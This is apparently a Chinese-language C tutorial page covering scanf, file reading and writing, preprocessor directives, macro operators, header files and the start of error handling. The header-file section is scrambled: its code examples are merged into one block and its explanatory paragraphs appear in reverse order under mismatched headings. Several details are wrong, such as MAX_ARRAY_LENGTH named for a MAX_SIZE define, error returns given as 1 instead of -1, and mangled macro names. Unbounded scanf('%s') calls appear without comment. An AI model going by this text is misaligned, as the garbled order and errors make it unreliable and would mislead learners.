<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span> </span><br><span class="line">&#123;    </span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>];   </span><br><span class="line">  <span class="type">int</span> i;    </span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">&quot;Enter a value :&quot;</span>);   </span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s %d&quot;</span>, str, &amp;i);    </span><br><span class="line">  <span class="built_in">printf</span>( <span class="string">&quot;\nYou entered: %s %d &quot;</span>, str, i);   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);   </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取输入，显示如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">Enter a value :runoob <span class="number">123</span></span><br><span class="line"></span><br><span class="line">You entered: runoob <span class="number">123</span> </span><br></pre></td></tr></table></figure>

<p>在这里，应当指出的是，scanf() 期待输入的格式与您给出的 %s 和 %d 相同，这意味着您必须提供有效的输入，比如 “string integer”，如果您提供的是 “string string” 或 “integer integer”，它会被认为是错误的输入。另外，在读取字符串时，只要遇到一个空格，scanf() 就会停止读取，所以 “this is test” 对 scanf() 来说是三个字符串。</p>
<h1 id="C文件读写"><a href="#C文件读写" class="headerlink" title="C文件读写"></a>C文件读写</h1><p>一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。C 语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。</p>
<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p>函数调用原型:</p>
<p>fopen():</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">( <span class="type">const</span> <span class="type">char</span> * filename, <span class="type">const</span> <span class="type">char</span> * mode )</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>fopen_s(): errno_t &#x3D; 0 表示成功,其余值表示失败</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">errno_t</span> <span class="title function_">fopen_s</span><span class="params">( FILE** pFile, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode )</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>mode取值:</p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">r</td>
<td align="left">打开一个已有的文本文件，允许读取文件。</td>
</tr>
<tr>
<td align="left">w</td>
<td align="left">打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td>
</tr>
<tr>
<td align="left">a</td>
<td align="left">打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td>
</tr>
<tr>
<td align="left">r+</td>
<td align="left">打开一个文本文件，允许读写文件。</td>
</tr>
<tr>
<td align="left">w+</td>
<td align="left">打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td>
</tr>
<tr>
<td align="left">a+</td>
<td align="left">打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td>
</tr>
</tbody></table>
<p>如果处理的是二进制文件,则需使用下面的访问模式来取代上面的访问模式：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="string">&quot;rb&quot;</span>, <span class="string">&quot;wb&quot;</span>, <span class="string">&quot;ab&quot;</span>, <span class="string">&quot;rb+&quot;</span>, <span class="string">&quot;r+b&quot;</span>, <span class="string">&quot;wb+&quot;</span>, <span class="string">&quot;w+b&quot;</span>, <span class="string">&quot;ab+&quot;</span>, <span class="string">&quot;a+b&quot;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><p>函数原型:</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *fp)</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。这个函数实际上，会清空缓冲区中的数据，关闭文件，并释放用于该文件的所有内存。EOF 是一个定义在头文件 <strong>stdio.h</strong> 中的常量。</p>
<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>把字符写入流中的最简单的函数:</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="type">int</span> <span class="title function_">fputc</span><span class="params">(<span class="type">int</span> c, FILE *fp)</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>函数 <strong>fputc()</strong> 把参数 c 的字符值写入到 fp 所指向的输出流中。如果写入成功，它会返回写入的字符，如果发生错误，则会返回 <strong>EOF</strong>。</p>
<p>把一个以 null 结尾的字符串写入到流中：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *s, FILE *fp )</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>函数 <strong>fputs()</strong> 把字符串 <strong>s</strong> 写入到 fp 所指向的输出流中。如果写入成功，它会返回一个非负值，如果发生错误，则会返回 <strong>EOF</strong>。</p>
<p>使用 <strong>int fprintf(FILE *fp,const char *format, …)</strong> 函数来写把一个字符串写入到文件中:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">  fp = fopen(<span class="string">&quot;/text.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(fp,<span class="string">&quot;This is testing for fprintf...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;This is testing for fputs...\n&quot;</span>, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>从文件读取单个字符的最简单的函数:</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fgetc</span><span class="params">(FILE *fp)</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>fgetc()</strong> 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符，如果发生错误则返回 <strong>EOF</strong>。</p>
<p>从流中读取一个字符串：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">( <span class="type">char</span> *buf, <span class="type">int</span> n, FILE *fp )</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>函数 <strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p>
<p>如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。</p>
<p>使用 <strong>int fscanf(FILE *fp, const char *format, …)</strong> 函数来从文件中读取字符串，但是在遇到第一个<strong>空格</strong>和<strong>换行符</strong>时，它会停止读取:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="type">char</span> buff[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">&quot;/test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;1: %s\n&quot;</span>, buff );</span><br><span class="line"> </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;2: %s\n&quot;</span>, buff );</span><br><span class="line">   </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;3: %s\n&quot;</span>, buff );</span><br><span class="line">   fclose(fp);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果:</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">1</span>: This</span><br><span class="line">&gt;<span class="number">2</span>: is testing <span class="keyword">for</span> <span class="built_in">fprintf</span>...</span><br><span class="line"></span><br><span class="line">&gt;<span class="number">3</span>: This is testing <span class="keyword">for</span> <span class="built_in">fputs</span>...</span><br></pre></td></tr></table></figure>
</blockquote>
<p>首先，<strong>fscanf()</strong> 方法只读取了 <strong>This</strong>，因为它在后边遇到了一个空格。其次，调用 <strong>fgets()</strong> 读取剩余的部分，直到行尾。最后，调用 <strong>fgets()</strong> 完整地读取第二行。</p>
<p><strong>strtok()</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strtok</span><span class="params">(<span class="type">char</span> s[], <span class="type">const</span> <span class="type">char</span> *delim)</span>;</span><br></pre></td></tr></table></figure>

<p>分解字符串为一组字符串。s为要分解的字符串，delim为分隔符字符（如果传入字符串，则传入的字符串中每个字符均为分割符）。首次调用时，s指向要分解的字符串，之后再次调用要把s设成NULL。</p>
<h2 id="二进制I-x2F-O函数"><a href="#二进制I-x2F-O函数" class="headerlink" title="二进制I&#x2F;O函数"></a>二进制I&#x2F;O函数</h2><p>下面两个函数用于二进制输入和输出:</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span><br><span class="line"><span class="params">       <span class="type">size_t</span> number_of_elements, FILE *a_file)</span>;</span><br><span class="line">        </span><br><span class="line">&gt;<span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size_of_elements, </span></span><br><span class="line"><span class="params">       <span class="type">size_t</span> number_of_elements, FILE *a_file)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这两个函数都是用于存储块的读写 - 通常是数组或结构体。</p>
<h1 id="C预处理器"><a href="#C预处理器" class="headerlink" title="C预处理器"></a>C预处理器</h1><p><strong>C 预处理器</strong>不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。我们将把 C 预处理器（C Preprocessor）简写为 CPP。</p>
<p>所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。下面列出了所有重要的预处理器指令：</p>
<table>
<thead>
<tr>
<th align="left">指令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">#define</td>
<td align="left">定义宏</td>
</tr>
<tr>
<td align="left">#include</td>
<td align="left">包含一个源代码文件</td>
</tr>
<tr>
<td align="left">#undef</td>
<td align="left">取消已定义的宏</td>
</tr>
<tr>
<td align="left">#ifdef</td>
<td align="left">如果宏已经定义，则返回真</td>
</tr>
<tr>
<td align="left">#ifndef</td>
<td align="left">如果宏没有定义，则返回真</td>
</tr>
<tr>
<td align="left">#if</td>
<td align="left">如果给定条件为真，则编译下面代码</td>
</tr>
<tr>
<td align="left">#else</td>
<td align="left">#if 的替代方案</td>
</tr>
<tr>
<td align="left">#elif</td>
<td align="left">如果前面的 #if 给定条件不为真，当前条件为真，则编译下面代码</td>
</tr>
<tr>
<td align="left">#endif</td>
<td align="left">结束一个 #if……#else 条件编译块</td>
</tr>
<tr>
<td align="left">#error</td>
<td align="left">当遇到标准错误时，输出错误消息</td>
</tr>
<tr>
<td align="left">#pragma</td>
<td align="left">使用标准化方法，向编译器发布特殊的命令到编译器中</td>
</tr>
</tbody></table>
<h2 id="预处理器实例"><a href="#预处理器实例" class="headerlink" title="预处理器实例"></a>预处理器实例</h2><blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 20</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个指令告诉 CPP 把所有的 MAX_ARRAY_LENGTH 替换为 20。使用 <em>#define</em> 定义常量来增强可读性。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">&gt;<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这些指令告诉 CPP 从<strong>系统库</strong>中获取 stdio.h，并添加文本到当前的源文件中。下一行告诉 CPP 从本地目录中获取 <strong>myheader.h</strong>，并添加内容到当前的源文件中。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;<span class="meta">#<span class="keyword">undef</span>  FILE_SIZE</span></span><br><span class="line">&gt;<span class="meta">#<span class="keyword">define</span> FILE_SIZE 42</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个指令告诉 CPP 取消已定义的 FILE_SIZE，并定义它为 42。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MESSAGE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE <span class="string">&quot;You wish!&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个指令告诉 CPP 只有当 MESSAGE 未定义时，才定义 MESSAGE。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="comment">/* Your debugging statements here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这个指令告诉 CPP 如果定义了 DEBUG，则执行处理语句。在编译时，如果您向 gcc 编译器传递了 <em>-DDEBUG</em> 开关量，这个指令就非常有用。它定义了 DEBUG，您可以在编译期间随时开启或关闭调试。</p>
<h2 id="预定义宏"><a href="#预定义宏" class="headerlink" title="预定义宏"></a>预定义宏</h2><p>ANSI C 定义了许多宏。在编程中您可以使用这些宏，但是不能直接修改这些预定义的宏。</p>
<table>
<thead>
<tr>
<th align="left">宏</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">_<em>DATE</em>_</td>
<td align="left">当前日期，一个以 “MMM DD YYYY” 格式表示的字符常量。</td>
</tr>
<tr>
<td align="left">_<em>TIME</em>_</td>
<td align="left">当前时间，一个以 “HH:MM:SS” 格式表示的字符常量。</td>
</tr>
<tr>
<td align="left">_<em>FILE</em>_</td>
<td align="left">这会包含当前文件名，一个字符串常量。</td>
</tr>
<tr>
<td align="left">_<em>LINE</em>_</td>
<td align="left">这会包含当前行号，一个十进制常量。</td>
</tr>
<tr>
<td align="left">_<em>STDC</em>_</td>
<td align="left">当编译器以 ANSI 标准编译时，则定义为 1。</td>
</tr>
</tbody></table>
<p>让我们来尝试下面的实例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;File :%s\n&quot;</span>, __FILE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Date :%s\n&quot;</span>, __DATE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Time :%s\n&quot;</span>, __TIME__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Line :%d\n&quot;</span>, __LINE__ );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;ANSI :%d\n&quot;</span>, __STDC__ );</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码（在文件 <strong>test.c</strong> 中）被编译和执行时，它会产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">File :test.c</span><br><span class="line">Date :Jun <span class="number">2</span> <span class="number">2012</span></span><br><span class="line">Time :<span class="number">03</span>:<span class="number">36</span>:<span class="number">24</span></span><br><span class="line">Line :<span class="number">8</span></span><br><span class="line">ANSI :<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="预处理器运算符"><a href="#预处理器运算符" class="headerlink" title="预处理器运算符"></a>预处理器运算符</h2><p>C 预处理器提供了下列的运算符来帮助您创建宏：</p>
<h5 id="宏延续运算符（-）"><a href="#宏延续运算符（-）" class="headerlink" title="宏延续运算符（\）"></a>宏延续运算符（\）</h5><p>一个宏通常写在一个单行上。但是如果宏太长，一个单行容纳不下，则使用宏延续运算符（\）。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  message_for(a, b)  \</span></span><br><span class="line"><span class="meta">    printf(#a <span class="string">&quot; and &quot;</span> #b <span class="string">&quot;: We love you!\n&quot;</span>)</span></span><br></pre></td></tr></table></figure>

<h5 id="字符串常量化运算符（-）"><a href="#字符串常量化运算符（-）" class="headerlink" title="字符串常量化运算符（#）"></a>字符串常量化运算符（#）</h5><p>在宏定义中，当需要把一个宏的参数转换为字符串常量时，则使用字符串常量化运算符（#）。在宏中使用的该运算符有一个特定的参数或参数列表。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  message_for(a, b)  \</span></span><br><span class="line"><span class="meta">    printf(#a <span class="string">&quot; and &quot;</span> #b <span class="string">&quot;: We love you!\n&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   message_for(Carole, Debra);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Carole and Debra: We love you!</span><br></pre></td></tr></table></figure>

<h5 id="标记粘贴运算符（-）"><a href="#标记粘贴运算符（-）" class="headerlink" title="标记粘贴运算符（##）"></a>标记粘贴运算符（##）</h5><p>宏定义内的标记粘贴运算符（##）会合并两个参数。它允许在宏定义中两个独立的标记被合并为一个标记。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> tokenpaster(n) printf (<span class="string">&quot;token&quot;</span> #n <span class="string">&quot; = %d&quot;</span>, token##n)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> token34 = <span class="number">40</span>;</span><br><span class="line">   </span><br><span class="line">   tokenpaster(<span class="number">34</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">token34 = <span class="number">40</span></span><br></pre></td></tr></table></figure>

<p>这是怎么发生的，因为这个实例会从编译器产生下列的实际输出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;token34 = %d&quot;</span>, token34);</span><br></pre></td></tr></table></figure>

<p>这个实例演示了 token##n 会连接到 token34 中，在这里，我们使用了<strong>字符串常量化运算符（#）</strong>和<strong>标记粘贴运算符（##）</strong>。</p>
<h5 id="defined-运算符"><a href="#defined-运算符" class="headerlink" title="defined() 运算符"></a>defined() 运算符</h5><p>预处理器 <strong>defined</strong> 运算符是用在常量表达式中的，用来确定一个标识符是否已经使用 #define 定义过。如果指定的标识符已定义，则值为真（非零）。如果指定的标识符未定义，则值为假（零）。下面的实例演示了 defined() 运算符的用法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined (MESSAGE)</span></span><br><span class="line">   <span class="meta">#<span class="keyword">define</span> MESSAGE <span class="string">&quot;You wish!&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Here is the message: %s\n&quot;</span>, MESSAGE);  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Here is the message: You wish!</span><br></pre></td></tr></table></figure>

<h2 id="参数化的宏"><a href="#参数化的宏" class="headerlink" title="参数化的宏"></a>参数化的宏</h2><p>CPP 一个强大的功能是可以使用参数化的宏来模拟函数。例如，下面的代码是计算一个数的平方：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以使用宏重写上面的代码，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> square(x) ((x) * (x))</span></span><br></pre></td></tr></table></figure>

<p>在使用带有参数的宏之前，必须使用 <strong>#define</strong> 指令定义。参数列表是括在圆括号内，且必须紧跟在宏名称的后边。宏名称和左圆括号之间不允许有空格。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x,y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Max between 20 and 10 is %d\n&quot;</span>, MAX(<span class="number">10</span>, <span class="number">20</span>));  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Max between <span class="number">20</span> and <span class="number">10</span> is <span class="number">20</span></span><br></pre></td></tr></table></figure>

<h1 id="C头文件"><a href="#C头文件" class="headerlink" title="C头文件"></a>C头文件</h1><p>头文件是扩展名为 <strong>.h</strong> 的文件，包含了 C 函数声明和宏定义，被多个源文件中引用共享。有两种类型的头文件：程序员编写的头文件和编译器自带的头文件。</p>
<p>在程序中要使用头文件，需要使用 C 预处理指令 <strong>#include</strong> 来引用它。前面我们已经看过 <strong>stdio.h</strong> 头文件，它是编译器自带的头文件。</p>
<p>引用头文件相当于复制头文件的内容，但是我们不会直接在源文件中复制头文件的内容，因为这么做很容易出错，特别在程序是由多个源文件组成的时候。</p>
<p>A simple practice in C 或 C++ 程序中，建议把所有的常量、宏、系统全局变量和函数原型写在头文件中，在需要的时候随时引用这些头文件。</p>
<h2 id="引用头文件的语法"><a href="#引用头文件的语法" class="headerlink" title="引用头文件的语法"></a>引用头文件的语法</h2><p>使用预处理指令 <strong>#include</strong> 可以引用用户和系统头文件。它的形式有以下两种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;file&gt;</span><br><span class="line">#include &quot;file&quot;</span><br><span class="line">char *test (void);</span><br><span class="line">int x;</span><br><span class="line">#include &quot;header.h&quot;</span><br><span class="line"></span><br><span class="line">int main (void)</span><br><span class="line">&#123;</span><br><span class="line">   puts (test ());</span><br><span class="line">&#125;</span><br><span class="line">int x;</span><br><span class="line">char *test (void);</span><br><span class="line"></span><br><span class="line">int main (void)</span><br><span class="line">&#123;</span><br><span class="line">   puts (test ());</span><br><span class="line">&#125;</span><br><span class="line">#ifndef HEADER_FILE</span><br><span class="line">#define HEADER_FILE</span><br><span class="line"></span><br><span class="line">the entire header file file</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line">#if SYSTEM_1</span><br><span class="line">   # include &quot;system_1.h&quot;</span><br><span class="line">#elif SYSTEM_2</span><br><span class="line">   # include &quot;system_2.h&quot;</span><br><span class="line">#elif SYSTEM_3</span><br><span class="line">   ...</span><br><span class="line">#endif</span><br><span class="line"> #define SYSTEM_H &quot;system_1.h&quot;</span><br><span class="line"> ...</span><br><span class="line"> #include SYSTEM_H</span><br></pre></td></tr></table></figure>

<p>SYSTEM_H 会扩展，预处理器会查找 system_1.h，就像 <strong>#include</strong> 最初编写的那样。SYSTEM_H 可通过 -D 选项被您的 Makefile 定义。</p>
<p>但是如果头文件比较多的时候，这么做是很不妥当的，预处理器使用宏来定义头文件的名称。这就是所谓的<strong>有条件引用</strong>。它不是用头文件的名称作为 <strong>#include</strong> 的直接参数，您只需要使用宏名称代替即可：</p>
<p>有时需要从多个不同的头文件中选择一个引用到程序中。例如，需要指定在不同的操作系统上使用的配置参数。您可以通过一系列条件来实现这点，如下：</p>
<h2 id="有条件引用"><a href="#有条件引用" class="headerlink" title="有条件引用"></a>有条件引用</h2><p>这种结构就是通常所说的包装器 <strong>#ifndef</strong>。当再次引用头文件时，条件为假，因为 HEADER_FILE 已定义。此时，预处理器会跳过文件的整个内容，编译器会忽略它。</p>
<p>如果一个头文件被引用两次，编译器会处理两次头文件的内容，这将产生错误。为了防止这种情况，标准的做法是把文件的整个内容放在条件编译语句中，如下：</p>
<h2 id="只引用一次头文件"><a href="#只引用一次头文件" class="headerlink" title="只引用一次头文件"></a>只引用一次头文件</h2><p>编译器会看到如下的代码信息：</p>
<p>和一个使用了头文件的主程序 <em>program.c</em>，如下：</p>
<p><strong>#include</strong> 指令会指示 C 预处理器浏览指定的文件作为输入。预处理器的输出包含了已经生成的输出，被引用文件生成的输出以及 <strong>#include</strong> 指令之后的文本输出。例如，如果您有一个头文件 header.h，如下：</p>
<h2 id="引用头文件的操作"><a href="#引用头文件的操作" class="headerlink" title="引用头文件的操作"></a>引用头文件的操作</h2><p>这种形式用于引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。</p>
<p>这种形式用于引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。在编译源代码时，您可以通过 -I 选项把目录前置在该列表前。</p>
<h1 id="C错误处理"><a href="#C错误处理" class="headerlink" title="C错误处理"></a>C错误处理</h1><p>C 语言不提供对错误处理的直接支持，但是作为一种系统编程语言，它以返回值的形式允许您访问底层数据。在发生错误时，大多数的 C 或 UNIX 函数调用返回 1 或 NULL，同时会设置一个错误代码 <strong>errno</strong>，该错误代码是全局变量，表示在函数调用期间发生了错误。您可以在 errno.h 头文件中找到各种各样的错误代码。</p>
<p>所以，C 程序员可以通过检查返回值，然后根据返回值决定采取哪种适当的动作。开发人员应该在程序初始化时，把 errno 设置为 0，这是一种良好的编程习惯。0 值表示程序中没有错误。</p>
<h2 id="errno-、perror-和strerror"><a href="#errno-、perror-和strerror" class="headerlink" title="errno()、perror()和strerror()"></a>errno()、perror()和strerror()</h2><p>C 语言提供了 <strong>perror()</strong> 和 <strong>strerror()</strong> 函数来显示与 <strong>errno</strong> 相关的文本消息。</p>
<ul>
